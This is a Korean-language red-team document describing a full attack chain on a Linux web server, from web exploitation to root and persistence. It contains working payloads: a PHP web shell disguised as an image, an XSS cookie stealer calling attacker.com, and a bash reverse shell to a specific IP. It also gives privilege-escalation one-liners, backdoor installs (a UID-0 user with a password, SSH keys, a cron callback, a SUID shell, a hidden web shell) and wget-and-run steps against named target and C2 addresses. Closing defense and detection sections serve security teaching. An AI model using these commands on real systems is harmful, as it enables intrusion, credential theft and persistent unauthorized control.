# 전체 공격 체인 상세 설명

## 목차
1. [공격 체인 개요](#공격-체인-개요)
2. [왜 이런 순서인가?](#왜-이런-순서인가)
3. [단계별 상세 설명](#단계별-상세-설명)
4. [사용된 기법 (MITRE ATT&CK)](#사용된-기법-mitre-attck)
5. [실행 방법](#실행-방법)
6. [방어 방법](#방어-방법)

---

## 공격 체인 개요

### 공격 플로우 다이어그램

```
┌─────────────────────────────────────────────────────────────────┐
│                        공격 체인 (Attack Chain)                  │
└─────────────────────────────────────────────────────────────────┘

1️⃣ 초기 침투 (Initial Access)
   ↓
   [auto.py]
   ├─ SQL Injection → 인증 우회
   ├─ File Upload → 웹쉘 업로드 (shell.jpg)
   ├─ LFI → 시스템 파일 읽기
   ├─ Stored XSS → 사용자 세션 탈취
   └─ CSRF → 피해자 계정 조작

2️⃣ 실행 (Execution)
   ↓
   [post_exploit.py]
   ├─ 웹쉘 접근 (file.php?name=shell.jpg&cmd=...)
   ├─ 시스템 정보 수집
   └─ Reverse Shell 획득

3️⃣ 지속성 확보 (Persistence)
   ↓
   [권한 상승 → 백도어 설치]

4️⃣ 권한 상승 (Privilege Escalation)
   ↓
   [privilege_escalation.sh]
   ├─ SUID 바이너리 악용
   ├─ Sudo 권한 악용
   ├─ Kernel Exploit
   ├─ Docker 그룹 멤버십
   └─ /etc/passwd 쓰기 권한

5️⃣ 영속성 확보 (Persistence)
   ↓
   [backdoor_install.sh]
   ├─ SSH 백도어 (authorized_keys)
   ├─ 백도어 사용자 (UID 0)
   ├─ Cron 백도어 (자동 연결)
   ├─ SUID 백도어 (/usr/local/bin/update-checker)
   └─ 웹 백도어 (.system.php)

6️⃣ 완전 장악 (Full Compromise)
   ↓
   [SSH 직접 접속]
   └─ Root 권한으로 서버 완전 제어
```

---

## 왜 이런 순서인가?

### 1. 초기 침투가 먼저인 이유

**웹 애플리케이션 = 가장 쉬운 진입점**

- 인터넷에 노출된 서비스
- SSH나 다른 포트는 방화벽으로 막혀있을 가능성 높음
- 웹 취약점 (SQL Injection, File Upload)이 흔함
- 사용자 상호작용 없이 공격 가능

### 2. 웹쉘 → Reverse Shell 순서인 이유

**웹쉘의 한계:**
- HTTP 요청/응답 방식 → 느림
- 쌍방향 통신 불가능
- 탐지되기 쉬움 (웹 로그에 기록)
- 제한된 명령어 실행

**Reverse Shell의 장점:**
- 실시간 쌍방향 통신
- 완전한 TTY (터미널) 환경
- 탭 완성, 히스토리 등 사용 가능
- 네트워크 방화벽 우회 (Outbound 연결)

### 3. 권한 상승이 필요한 이유

**일반 사용자 권한의 한계:**
- 시스템 파일 수정 불가
- 중요 프로세스 제어 불가
- 다른 사용자 계정 접근 불가
- 백도어 설치 불가

**Root 권한 획득 시:**
- 시스템 전체 제어
- 로그 삭제/조작 가능
- 영구적 백도어 설치 가능
- 다른 시스템으로 확장 가능 (Lateral Movement)

### 4. 여러 백도어를 설치하는 이유

**단일 백도어의 위험:**
- 발견되면 접근 차단
- 시스템 재부팅 시 사라질 수 있음
- 패치/업데이트로 무력화

**다중 백도어 전략 (Defense in Depth 역이용):**
1. **SSH 백도어** → 가장 은밀하고 안정적
2. **백도어 사용자** → SSH 실패 시 대안
3. **Cron 백도어** → 자동 재연결 (연결 끊어져도 5분마다 재시도)
4. **SUID 백도어** → 로컬 권한 상승
5. **웹 백도어** → 웹을 통한 명령 실행

---

## 단계별 상세 설명

### 단계 1: 초기 침투 (auto.py)

#### 1.1 SQL Injection

**공격 기법:**
```python
username = "admin"
password = "' or '1'='1' --"
```

**작동 원리:**
```sql
-- 원래 쿼리
SELECT * FROM users WHERE username='admin' AND password='user_input';

-- 주입 후
SELECT * FROM users WHERE username='admin' AND password='' or '1'='1' --';

-- 결과: '1'='1'은 항상 참 → 로그인 성공
```

**MITRE ATT&CK:**
- T1190: Exploit Public-Facing Application
- T1078: Valid Accounts (인증 우회 후)

**CVE 참고:**
- CVE-2019-1253 (SQL Injection in Authentication)
- OWASP A03:2021 - Injection

#### 1.2 File Upload (웹쉘 업로드)

**공격 기법:**
```php
// shell.jpg 내용
<?php system($_GET['cmd']); ?>
```

**우회 기법:**
1. **확장자 우회:**
   - `shell.php` → 차단
   - `shell.jpg` → PHP로 실행됨 (서버 설정 오류)

2. **MIME 타입 조작:**
   ```
   Content-Type: image/jpeg
   ```

3. **Null Byte Injection:**
   - `shell.php%00.jpg` → PHP 5.3 이하 취약

**MITRE ATT&CK:**
- T1105: Ingress Tool Transfer
- T1059.004: Command and Scripting Interpreter: Unix Shell

**CVE 참고:**
- CVE-2021-41773 (Apache Path Traversal & File Upload)

#### 1.3 Local File Inclusion (LFI)

**공격 기법:**
```
/file.php?name=../../../etc/passwd
```

**읽을 수 있는 중요 파일:**
```bash
/etc/passwd          # 사용자 목록
/etc/shadow          # 비밀번호 해시 (권한 있으면)
/var/log/apache2/access.log  # 로그 파일
~/.ssh/id_rsa        # SSH 개인키
```

**MITRE ATT&CK:**
- T1083: File and Directory Discovery
- T1552.001: Credentials in Files

#### 1.4 Stored XSS

**공격 기법:**
```javascript
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**위험성:**
- 관리자가 게시물 확인 시 세션 탈취
- CSRF 토큰 우회
- 키로거 설치 가능

**MITRE ATT&CK:**
- T1185: Browser Session Hijacking
- T1056.003: Web Portal Capture

#### 1.5 CSRF (Cross-Site Request Forgery)

**공격 기법:**
```html
<!-- fake-gift.html -->
<img src="http://target.com/transfer.php?to=attacker&amount=1000">
```

**작동 과정:**
1. 피해자가 타겟 사이트에 로그인
2. 악성 링크 클릭 (fake-gift)
3. 피해자의 세션으로 자동 요청 전송
4. 포인트 이전, 프로필 변경 등

**MITRE ATT&CK:**
- T1539: Steal Web Session Cookie
- T1204.001: User Execution: Malicious Link

---

### 단계 2: 후속 공격 (post_exploit.py)

#### 2.1 웹쉘 접근

**실행 방식:**
```bash
http://target.com/file.php?name=shell.jpg&cmd=whoami
```

**중요한 이유:**
- 웹쉘 = 원격 코드 실행 (RCE)
- 시스템 명령어 실행 가능
- 다음 단계로 진행하기 위한 발판

#### 2.2 시스템 정보 수집

**수집 정보:**
```bash
whoami              # 현재 사용자
hostname            # 호스트명
uname -a            # 커널 버전 (Exploit 찾기)
id                  # 그룹 정보 (docker 등)
ps aux              # 실행 중인 프로세스
netstat -tulnp      # 열린 포트
cat /etc/os-release # OS 버전
```

**왜 중요한가?**
- 권한 상승 벡터 파악
- Kernel Exploit 검색
- 다른 서비스 발견 (MySQL, Redis 등)

**MITRE ATT&CK:**
- T1082: System Information Discovery
- T1033: System Owner/User Discovery
- T1057: Process Discovery

#### 2.3 Reverse Shell 획득

**페이로드:**
```bash
bash -c "bash -i >& /dev/tcp/57.181.28.7/4444 0>&1"
```

**작동 원리:**
```
타겟 서버 ──────────> 공격자 서버
         (아웃바운드)   (4444 리스너)

1. 타겟 서버가 공격자에게 연결 요청
2. 방화벽 우회 (Outbound 연결은 대부분 허용)
3. 쌍방향 쉘 확보
```

**왜 Reverse인가?**
- **Forward Shell (Bind Shell):**
  - 타겟 서버가 포트를 열고 대기
  - 방화벽에 막힐 가능성 높음

- **Reverse Shell:**
  - 타겟이 공격자에게 연결
  - Outbound 방화벽 우회

**MITRE ATT&CK:**
- T1059.004: Unix Shell
- T1071.001: Application Layer Protocol: Web Protocols

---

### 단계 3: 권한 상승 (privilege_escalation.sh)

#### 3.1 SUID 바이너리 악용

**SUID란?**
```bash
-rwsr-xr-x 1 root root /usr/bin/find
```
- `s` 비트 = SUID 설정
- 실행 시 파일 소유자 (root) 권한으로 실행

**악용 예시:**
```bash
# find가 SUID면
/usr/bin/find /etc/passwd -exec /bin/bash -p \;
# → root shell 획득!
```

**GTFOBins 참고:**
- https://gtfobins.github.io/

**MITRE ATT&CK:**
- T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid

#### 3.2 Sudo 권한 악용

**취약한 설정:**
```bash
# /etc/sudoers
user ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**악용:**
```bash
sudo vim -c ':!/bin/bash' /dev/null
```

**MITRE ATT&CK:**
- T1548.003: Sudo and Sudo Caching

#### 3.3 /etc/passwd 쓰기 권한

**만약 /etc/passwd에 쓰기 권한이 있다면:**
```bash
# 새 root 사용자 추가
echo 'hacked:$1$hacked$XjdKNyiHH8v2E4mQC5K9M0:0:0:root:/root:/bin/bash' >> /etc/passwd

# 로그인
su hacked  # 비밀번호: hacked
```

**MITRE ATT&CK:**
- T1098: Account Manipulation

#### 3.4 Docker 그룹 멤버십

**Docker 그룹 = Root 권한**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**이유:**
- Docker는 root로 실행
- 호스트 루트를 마운트하면 전체 파일시스템 접근

**MITRE ATT&CK:**
- T1611: Escape to Host

#### 3.5 Kernel Exploit

**유명한 Exploit:**
- **DirtyCow (CVE-2016-5195)**
  - 커널 2.6.22 ~ 4.8.3
  - /etc/passwd 쓰기 가능

- **CVE-2021-3493 (OverlayFS)**
  - Ubuntu 18.04, 20.04
  - 로컬 권한 상승

**MITRE ATT&CK:**
- T1068: Exploitation for Privilege Escalation

---

### 단계 4: 백도어 설치 (backdoor_install.sh)

#### 4.1 SSH 백도어 (authorized_keys)

**방법:**
```bash
echo "공격자_공개키" >> /root/.ssh/authorized_keys
```

**장점:**
- 가장 은밀함
- 정상적인 SSH 연결처럼 보임
- 로그에 기록되지만 의심받지 않음

**탐지 회피:**
```bash
# 정상적인 SSH 로그
Nov 06 16:00:00 sshd[1234]: Accepted publickey for root from 57.181.28.7
```

**MITRE ATT&CK:**
- T1098.004: SSH Authorized Keys
- T1136.001: Create Account: Local Account

#### 4.2 백도어 사용자 (UID 0)

**생성:**
```bash
useradd -m -s /bin/bash sysadmin
echo "sysadmin:P@ssw0rd123!" | chpasswd
sed -i 's/^sysadmin:x:[0-9]*/sysadmin:x:0:/' /etc/passwd
```

**UID 0의 의미:**
- Linux는 UID로 권한 판단
- UID 0 = root 권한
- 이름은 달라도 권한은 root

**MITRE ATT&CK:**
- T1136.001: Create Account: Local Account

#### 4.3 Cron 백도어 (자동 재연결)

**설정:**
```bash
# /etc/cron.d/system_update
*/5 * * * * root python3 -c 'import socket...' 2>/dev/null
```

**장점:**
- 연결이 끊어져도 5분마다 자동 재연결
- 재부팅 후에도 작동
- 시스템 업데이트처럼 보이는 이름

**MITRE ATT&CK:**
- T1053.003: Scheduled Task/Job: Cron

#### 4.4 SUID 백도어

**생성:**
```bash
cat > /usr/local/bin/update-checker << 'EOF'
#!/bin/bash
if [ "$1" = "--shell" ]; then
    /bin/bash -p
else
    echo "Checking for updates..."
fi
EOF
chmod 4755 /usr/local/bin/update-checker
```

**사용:**
```bash
/usr/local/bin/update-checker --shell
# → root shell!
```

**MITRE ATT&CK:**
- T1548.001: Setuid and Setgid

#### 4.5 웹 백도어

**생성:**
```php
<?php
// /var/www/html/.system.php
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>
```

**접근:**
```
http://target.com/.system.php?c=whoami
```

**MITRE ATT&CK:**
- T1505.003: Web Shell

---

## 사용된 기법 (MITRE ATT&CK)

### 전체 매핑

| 단계 | 전술 (Tactic) | 기법 (Technique) | 설명 |
|-----|-------------|----------------|------|
| 1 | Initial Access | T1190 | Exploit Public-Facing Application (SQL Injection, File Upload) |
| 2 | Execution | T1059.004 | Unix Shell (웹쉘, Reverse Shell) |
| 3 | Persistence | T1098.004 | SSH Authorized Keys |
| 3 | Persistence | T1136.001 | Create Local Account |
| 3 | Persistence | T1053.003 | Cron Job |
| 3 | Persistence | T1505.003 | Web Shell |
| 4 | Privilege Escalation | T1548.001 | SUID/SGID 악용 |
| 4 | Privilege Escalation | T1548.003 | Sudo 악용 |
| 4 | Privilege Escalation | T1068 | Kernel Exploit |
| 5 | Discovery | T1082 | System Information Discovery |
| 5 | Discovery | T1083 | File and Directory Discovery |
| 6 | Credential Access | T1552.001 | Credentials in Files |
| 7 | Lateral Movement | T1021.004 | SSH |
| 8 | Defense Evasion | T1070.001 | Clear Linux History |
| 9 | Command and Control | T1071.001 | Web Protocol (웹쉘) |
| 10 | Impact | T1531 | Account Access Removal (로그 삭제) |

---

## 실행 방법

### 방법 1: 완전 자동화

```bash
# 1. 공격자 서버 설정 (최초 1회)
./setup_attacker_server.sh 57.181.28.7

# 2. 전체 공격 실행
./full_attack_chain.sh 15.164.95.252 57.181.28.7

# 3. 지시에 따라 수동 단계 수행
#    - Reverse Shell 리스너 시작
#    - 권한 상승 스크립트 실행
#    - 백도어 설치 확인

# 4. 서버 접속
ssh sysadmin@15.164.95.252  # 비밀번호: P@ssw0rd123!
```

### 방법 2: 단계별 실행

```bash
# 1단계: 초기 침투
./run_attack.sh 15.164.95.252 57.181.28.7

# 2단계: C2 서버에서 리스너 시작
ssh ubuntu@57.181.28.7
nc -lvnp 4444

# 3단계: 후속 공격 (로컬)
python3 post_exploit.py 15.164.95.252 57.181.28.7 4444
# → 옵션 1 선택 (Reverse Shell)

# 4단계: Reverse Shell에서 권한 상승
cd /tmp
wget http://57.181.28.7:5000/scripts/privilege_escalation.sh
bash privilege_escalation.sh

# 5단계: Root 권한 획득 후 백도어 설치
wget http://57.181.28.7:5000/scripts/backdoor_install.sh
bash backdoor_install.sh 57.181.28.7

# 6단계: SSH 접속 확인
ssh sysadmin@15.164.95.252
```

---

## 방어 방법

### 웹 애플리케이션 보안

#### 1. SQL Injection 방어

**안전한 코드:**
```php
// BAD
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

// GOOD - Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$user, $pass]);
```

**추가 방어:**
- WAF (Web Application Firewall) 설치
- 입력 검증 및 이스케이프
- 최소 권한 DB 계정 사용

#### 2. File Upload 방어

**안전한 설정:**
```php
// 1. 확장자 화이트리스트
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $allowed)) die('Invalid file type');

// 2. MIME 타입 검증
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) die('Invalid MIME');

// 3. 업로드 디렉토리 실행 권한 제거
// .htaccess:
php_flag engine off
```

**Apache 설정:**
```apache
<Directory /var/www/html/uploads>
    php_admin_flag engine off
    AddType text/plain .php .php3 .php4 .php5 .phtml
</Directory>
```

#### 3. XSS 방어

**출력 이스케이프:**
```php
// BAD
echo "<div>" . $user_input . "</div>";

// GOOD
echo "<div>" . htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') . "</div>";
```

**Content Security Policy:**
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

#### 4. CSRF 방어

**CSRF 토큰:**
```php
// 토큰 생성
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 폼에 포함
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// 검증
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}
```

### 시스템 보안

#### 1. 권한 상승 방어

**SUID 최소화:**
```bash
# 불필요한 SUID 제거
chmod u-s /usr/bin/find

# 정기 점검
find / -perm -4000 -type f 2>/dev/null
```

**Sudo 정책:**
```bash
# /etc/sudoers
# BAD
user ALL=(ALL) NOPASSWD: ALL

# GOOD
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
```

#### 2. 백도어 탐지

**파일 무결성 모니터링:**
```bash
# AIDE 설치
apt install aide
aide --init
aide --check

# /etc/passwd, /etc/shadow 모니터링
```

**SSH 모니터링:**
```bash
# /root/.ssh/authorized_keys 변경 감지
auditctl -w /root/.ssh/authorized_keys -p wa -k ssh_keys

# 로그 확인
ausearch -k ssh_keys
```

**Cron 모니터링:**
```bash
# 새 Cron job 알림
auditctl -w /etc/cron.d/ -p wa -k cron_changes
```

#### 3. 네트워크 보안

**아웃바운드 방화벽:**
```bash
# 기본 차단
iptables -P OUTPUT DROP

# 허용할 것만 열기
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT   # HTTP
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT  # HTTPS
```

**이상 연결 탐지:**
```bash
# netstat 모니터링
watch -n 5 'netstat -tulnp | grep ESTABLISHED'

# Outbound 연결 로깅
iptables -A OUTPUT -m state --state NEW -j LOG --log-prefix "NEW_OUTBOUND: "
```

### 탐지 (Detection)

#### 로그 모니터링

**중요 로그:**
```bash
# 웹 서버 로그
/var/log/apache2/access.log
/var/log/nginx/access.log

# 인증 로그
/var/log/auth.log
/var/log/secure

# 시스템 로그
/var/log/syslog
```

**이상 패턴:**
```bash
# SQL Injection
grep -i "union\|select\|--\|or '1'='1'" /var/log/apache2/access.log

# 웹쉘 접근
grep -i "cmd=\|command=\|exec=" /var/log/apache2/access.log

# 파일 업로드
grep -i "POST.*upload" /var/log/apache2/access.log
```

#### SIEM 규칙

**Splunk/ELK 쿼리:**
```
# SQL Injection 탐지
source="/var/log/apache2/access.log"
| regex _raw="(union|select|--|'or|\"or|1=1)"

# 웹쉘 탐지
source="/var/log/apache2/access.log"
| regex _raw="(cmd=|command=|&c=|shell\.php)"

# Reverse Shell 탐지
source="/var/log/syslog"
| regex _raw="(bash.*tcp|nc.*-e|/dev/tcp)"
```

---

## 결론

### 공격자 관점

**성공 요인:**
1. 다층 방어 (Defense in Depth) 우회
2. 여러 취약점 체인화
3. 탐지 회피 기법 적용
4. 영속성 확보 (다중 백도어)

### 방어자 관점

**핵심 방어 전략:**
1. **입력 검증** - 모든 사용자 입력 검증
2. **최소 권한** - 필요한 권한만 부여
3. **모니터링** - 실시간 로그 분석
4. **패치 관리** - 정기적인 보안 업데이트
5. **다층 방어** - 한 계층이 뚫려도 다음 계층에서 막기

### 교훈

> "공격자는 한 번만 성공하면 되지만, 방어자는 항상 성공해야 한다"

이 공격 체인은 **실제 공격 시나리오**를 시뮬레이션하여:
- 보안 취약점의 심각성 이해
- 방어 전략 수립
- 보안 인식 향상

**승인된 환경**에서만 사용하세요!

---

## 참고 자료

### MITRE ATT&CK
- https://attack.mitre.org/

### 취약점 데이터베이스
- https://cve.mitre.org/
- https://www.exploit-db.com/

### 권한 상승
- https://gtfobins.github.io/
- https://github.com/carlospolop/PEASS-ng

### 웹 보안
- https://owasp.org/
- https://portswigger.net/web-security

### 침투 테스트
- https://www.offensive-security.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings

---

**작성일:** 2025-11-06
**작성자:** Red Team Automation Framework
**목적:** 교육 및 승인된 보안 테스트
